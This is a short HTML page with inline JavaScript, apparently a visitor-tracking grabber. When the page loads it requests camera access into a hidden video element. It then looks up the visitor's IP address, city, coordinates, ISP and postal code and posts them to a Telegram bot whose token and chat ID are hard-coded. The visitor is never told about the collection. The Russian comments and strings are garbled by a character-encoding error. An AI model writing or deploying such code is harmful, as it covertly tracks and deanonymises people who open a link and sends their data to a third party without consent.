<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Geolocation Data to Telegram</title>
</head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>

    <script>
        const botToken = '7399220684:AAHNirX_Nk3iLly349TKc-8v0WwvD1t1TEY'; // –í–∞—à —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
        const chatId = '6468946124'; // ID —á–∞—Ç–∞, –∫—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è
        const apiUrl = 'https://ip-api.com/json/';

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
        function sendMessageToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent:', data);
            })
            .catch(error => {
                console.error('Error sending message:', error);
            });
        }

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏–æ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;

                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–æ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                fetch(apiUrl)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'fail') {
                            console.error('API request failed:', data.message);
                            return;
                        }

                        const ipInfo = {
                            ip: data.query || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            hostname: data.reverse || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ', // –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ
                            city: data.city || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            region: data.regionName || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            country: data.country || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            coordinates: `${data.lat || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ'}, ${data.lon || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ'}`,
                            provider: data.isp || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            postal: data.zip || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            timezone: data.timezone || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            country_flag_url: `https://www.countryflags.io/${data.countryCode || 'xx'}/flat/64.png`,
                            latitude: data.lat || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ',
                            longitude: data.lon || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ'
                        };

                        const message = `
üåê
‚îú IP: ${ipInfo.ip}
‚îú Hostname: ${ipInfo.hostname}
‚îú –ì–æ—Ä–æ–¥: ${ipInfo.city}
‚îú –†–µ–≥–∏–æ–Ω: ${ipInfo.region}
‚îú –°—Ç—Ä–∞–Ω–∞: ${ipInfo.country}
‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${ipInfo.coordinates}
‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${ipInfo.provider}
‚îú –ò–Ω–¥–µ–∫—Å: ${ipInfo.postal}
‚îú –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${ipInfo.timezone}
‚îú <a href="${ipInfo.country_flag_url}">–§–ª–∞–≥ —Å—Ç—Ä–∞–Ω—ã</a>
‚îú –®–∏—Ä–æ—Ç–∞: ${ipInfo.latitude}
‚îî –î–æ–ª–≥–æ—Ç–∞: ${ipInfo.longitude}`;

                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
                        sendMessageToTelegram(message);
                    })
                    .catch(error => {
                        console.error('Error fetching IP data:', error);
                    });
            })
            .catch(error => {
                console.error("Error accessing the camera:", error);
            });
    </script>
</body>
</html>
